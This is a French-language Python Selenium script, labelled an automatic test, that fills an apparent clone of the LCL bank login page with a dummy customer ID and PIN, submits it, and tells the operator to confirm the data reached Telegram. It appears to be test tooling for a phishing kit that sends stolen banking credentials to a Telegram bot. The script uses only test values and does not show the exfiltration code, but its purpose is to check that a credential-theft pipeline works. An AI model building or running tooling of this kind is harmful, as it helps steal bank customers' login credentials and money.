#!/usr/bin/env python
"""
Test automatique : remplit les formulaires et envoie les données à Telegram
"""
import requests
import json
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

URL = "https://ample-eagerness-production-1128.up.railway.app/"

print("🤖 TEST AUTOMATIQUE - REMPLISSAGE DES FORMULAIRES\n")

# Configuration Selenium (mode headless)
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")

try:
    driver = webdriver.Chrome(options=chrome_options)
    print(f"📍 Ouverture de {URL}\n")
    driver.get(URL)
    
    # Attendre le chargement
    time.sleep(2)
    
    # Test 1 : Formulaire LCL
    print("=" * 60)
    print("TEST 1: Formulaire LCL")
    print("=" * 60)
    
    try:
        # Remplir les 10 chiffres d'identifiant
        id_inputs = driver.find_elements(By.CLASS_NAME, "id-digit")
        print(f"Trouvé {len(id_inputs)} champs d'identifiant\n")
        
        test_id = "1234567890"
        for i, digit in enumerate(test_id):
            id_inputs[i].send_keys(digit)
            print(f"  Champ {i+1}: {digit}")
        
        time.sleep(1)
        
        # Cliquer sur "Suivant"
        next_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Suivant')]")
        print("\n✅ Clique sur 'Suivant'")
        next_btn.click()
        
        time.sleep(2)
        
        # Remplir le code personnel (6 chiffres)
        print("\n  Saisie du code personnel: 123456")
        keys = driver.find_elements(By.CLASS_NAME, "key:not(.clear-key)")
        
        test_code = "123456"
        for digit in test_code:
            for key in keys:
                if key.text == digit:
                    key.click()
                    print(f"    Clique sur {digit}")
                    time.sleep(0.3)
                    break
        
        time.sleep(1)
        
        # Cliquer sur "Valider"
        validate_btn = driver.find_element(By.ID, "validateBtn")
        print("\n✅ Clique sur 'Valider'")
        validate_btn.click()
        
        time.sleep(3)
        
        # Vérifier les logs
        print("\n📡 Vérification de l'envoi Telegram...")
        print("  Attendez quelques secondes pour recevoir le message sur Telegram\n")
        
    except Exception as e:
        print(f"❌ Erreur lors du remplissage: {e}\n")
    
    # Prendre une capture d'écran
    driver.save_screenshot("test_result.png")
    print("📸 Capture d'écran sauvegardée: test_result.png\n")
    
    driver.quit()
    
except Exception as e:
    print(f"❌ Erreur Selenium: {e}")
    print("\nInstallation requise: pip install selenium")

print("\n" + "=" * 60)
print("✅ TEST TERMINÉ")
print("=" * 60)
print("\n📋 Vérifiez que vous avez reçu un message sur Telegram")
